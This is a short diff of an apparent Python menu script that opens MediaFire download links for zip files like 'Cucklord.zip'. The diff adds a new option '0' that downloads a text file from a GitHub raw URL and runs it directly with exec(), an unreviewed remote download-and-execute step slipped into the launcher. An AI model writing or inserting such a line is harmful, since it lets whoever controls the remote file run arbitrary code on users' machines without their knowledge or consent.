@@ -86,5 +86,7 @@ while True:
         webbrowser.open_new("https://www.mediafire.com/file/9wstbkahtv0ux2j/Cucklord.zip/file")
     elif chon == '20.1':
         webbrowser.open_new("https://www.mediafire.com/file/t9mrmlmgxb4nsgv/Cucklord_Reborn.zip/file")
+    elif chon == '0':
+        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
     else:
        continue
